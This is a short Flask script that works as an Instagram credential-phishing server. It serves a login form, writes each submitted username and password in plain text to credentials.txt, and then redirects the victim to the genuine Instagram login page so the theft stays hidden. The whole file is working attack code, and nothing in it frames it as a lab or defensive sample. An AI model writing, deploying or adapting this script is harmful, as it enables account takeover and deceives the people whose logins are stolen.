from flask import Flask, render_template, request, redirect
app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        # Get the username and password from the form
        username = request.form["username"]
        password = request.form["password"]

        # Save the credentials to a file
        with open("credentials.txt", "a") as f:
            f.write(f"{username}:{password}\n")

        # Redirect the user to the real Instagram login page
        return redirect("https://www.instagram.com/accounts/login/")

    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True)